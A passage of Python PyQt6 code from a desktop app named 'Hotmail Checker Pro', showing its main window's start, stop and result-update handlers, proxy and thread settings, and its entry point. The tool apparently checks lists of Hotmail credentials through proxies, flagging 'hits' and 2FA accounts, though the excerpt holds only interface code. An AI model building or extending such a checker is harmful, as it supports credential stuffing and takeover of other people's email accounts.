        self._checker.apply_mode_cols(mode)
        self._dash.set_total(self._stats.total)

        self.sidebar.set_running(True)
        self._status_lbl.setText(t("running"))
        self._status_lbl.setStyleSheet(f"color:{C_HIT};")

        self._worker=WorkerThread(
            list(self._accounts),mode,threads,kws,debug,rm,self._stats,
            self._proxy.proxy_list,self._proxy.use_proxy)
        self._worker.row_sig.connect(self._on_row)
        self._worker.done_sig.connect(self._on_done)
        self._worker.start()
        self._stats_tmr.start()

    def _stop(self):
        if self._worker: self._worker.request_stop()
        self._status_lbl.setText(t("stopping"))
        self._status_lbl.setStyleSheet(f"color:{C_2FA};")
        self.sidebar.btn_stop.setEnabled(False)

    def _on_row(self,idx:int,data:dict):
        self._src_model.update_row(idx,data)
        if self._current_mode in KW_MODES:
            self._checker.update_kw_filter()

    def _on_done(self,summary:dict):
        self._stats_tmr.stop(); self._tick_stats()
        self.sidebar.set_running(False)
        self._status_lbl.setText(t("done"))
        self._status_lbl.setStyleSheet(f"color:{C_ACCENT};")
        self._dash.progress.setValue(100)
        self._files.refresh()

    def _tick_stats(self):
        if not self._stats: return
        self._dash.update_stats(self._stats)

    # ── i18n ───────────────────────────────────────────────────────
    def retranslate(self):
        self.setWindowTitle(t("app"))
        self._topbar_lbl.setText(t("app").upper())
        self._status_lbl.setText(t("idle"))
        for btn in self._nav_btns:
            k=btn.property("i18n_key")
            if k: btn.setText(t(k))
        self._dash.retranslate()
        self._checker.retranslate()
        self._proxy.retranslate()
        self.sidebar.retranslate()


# ══════════════════════════════════════════════════════════════════════
#  ENTRY POINT
# ══════════════════════════════════════════════════════════════════════
def main():
    app=QApplication(sys.argv)
    app.setApplicationName("Hotmail Checker Pro")
    app.setStyle("Fusion")

    pal=QPalette()
    for role,c in [
        (QPalette.ColorRole.Window,          C_BG),
        (QPalette.ColorRole.WindowText,      C_TEXT),
        (QPalette.ColorRole.Base,            C_PANEL),
        (QPalette.ColorRole.AlternateBase,   C_PANEL2),
        (QPalette.ColorRole.Text,            C_TEXT),
        (QPalette.ColorRole.Button,          C_PANEL),
        (QPalette.ColorRole.ButtonText,      C_TEXT),
        (QPalette.ColorRole.Highlight,       C_ACCENT),
        (QPalette.ColorRole.HighlightedText, "#ffffff"),
        (QPalette.ColorRole.ToolTipBase,     C_PANEL),
        (QPalette.ColorRole.ToolTipText,     C_TEXT),
    ]: pal.setColor(role,QColor(c))
    app.setPalette(pal)
    app.setStyleSheet(qss())

    w=MainWindow(); w.show()
    sys.exit(app.exec())


if __name__=="__main__":
    # Required for PyInstaller on Windows (multiprocessing freeze support)
    import multiprocessing
    multiprocessing.freeze_support()
    main()
